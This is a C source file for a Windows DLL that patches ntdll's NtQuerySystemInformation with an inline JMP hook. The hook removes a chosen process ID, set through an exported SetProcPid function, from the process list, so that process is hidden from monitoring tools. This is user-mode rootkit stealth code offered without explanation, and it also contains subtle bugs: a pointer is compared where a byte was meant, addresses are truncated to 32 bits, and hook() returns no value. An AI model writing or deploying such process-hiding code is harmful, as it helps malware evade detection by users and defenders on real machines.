#include<windows.h>
#pragma(lib,"ntdll.dll")

#define STATUS_SUCCESS						(0x00000000L) 

typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *_NtQuerySystemInformation)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
HANDLE pid = 0;
#pragma data_seg()

BYTE g_pOrg[5] = { 0, };


BOOL hook(PROC newPorc,PBYTE pOrg)
{
	FARPROC fProc = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	PDWORD oldProtect;
	DWORD hAddress;
	BYTE pBuf[5] = { 0xE9, 0,};
	PBYTE pByte;
	pByte = (PBYTE)fProc;

	if (pByte == 0xE9) {
		return FALSE;
	}

	VirtualProtect((LPVOID)fProc, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
	memcpy(pOrg, fProc, 5);

	hAddress = (DWORD)newPorc - (DWORD)fProc - 5;
	memcpy(&pBuf[1], &hAddress, 4);

	memcpy(fProc, pBuf, 5);

	VirtualProtect((LPVOID)fProc, 5, oldProtect, &oldProtect);
}

BOOL un_hook(PBYTE pOrg)
{
	FARPROC fProc = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	PDWORD oldProtect;

	VirtualProtect((LPVOID)fProc, 5, PAGE_EXECUTE_READWRITE, &oldProtect);

	memcpy(fProc, pOrg, 5);

	VirtualProtect((LPVOID)fProc, 5, oldProtect, &oldProtect);

	return TRUE;
}

NTSTATUS WINAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	PVOID SystemInformation, 
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	un_hook(g_pOrg);

	NTSTATUS status;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev = NULL;
	FARPROC fProc = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	status = (_NtQuerySystemInformation)fProc(SystemInformationClass, SystemInformation, 
		SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFOTMAION_END;

	if (SystemInformationClass == SystemProcessInformation) {
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (pCur) {
			if (pCur->UniqueProcessId == pid) {
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
			}
			else
				pPrev = pCur;

			if (pCur->NextEntryOffset == 0) break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)
				((ULONG)pCur + pCur->NextEntryOffset);
		}
	}


__NTQUERYSYSTEMINFOTMAION_END:
	hook((PROC)NewNtQuerySystemInformation, g_pOrg);

	return status;

}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		hook((PROC)NewNtQuerySystemInformation,g_pOrg);
		break;
	case DLL_PROCESS_DETACH:
		un_hook(g_pOrg);
		break;
	}

	return TRUE;
}

#ifdef __cplusplus
extern "C" {
#endif
__declspec(dllexport) void SetProcPid(LPINT pPid)
{
	pid = pPid;
}
#ifdef __cplusplus
}
#endif